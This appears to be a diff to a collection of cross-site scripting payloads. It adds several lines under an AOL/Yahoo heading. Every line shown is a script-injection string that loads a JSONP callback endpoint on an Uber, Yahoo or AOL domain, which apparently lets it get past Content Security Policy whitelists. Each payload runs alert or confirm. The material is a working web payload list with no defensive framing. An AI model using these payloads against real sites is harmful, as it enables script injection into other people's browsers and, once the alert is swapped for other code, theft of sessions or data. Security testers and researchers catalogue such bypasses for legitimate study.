@@ -24,6 +24,9 @@
 #Uber.com:
 "><script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"></script>
 #AOL/Yahoo
+"><script+src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)"></script>
+"><script+src="https://mempf.yahoo.co.jp/offer?position=h&callback=alert(1337)"></script>
+"><script+src="https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-"></script>
 "><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>
 "><script+src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679"></script>
 "><script+src="https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374"></script>
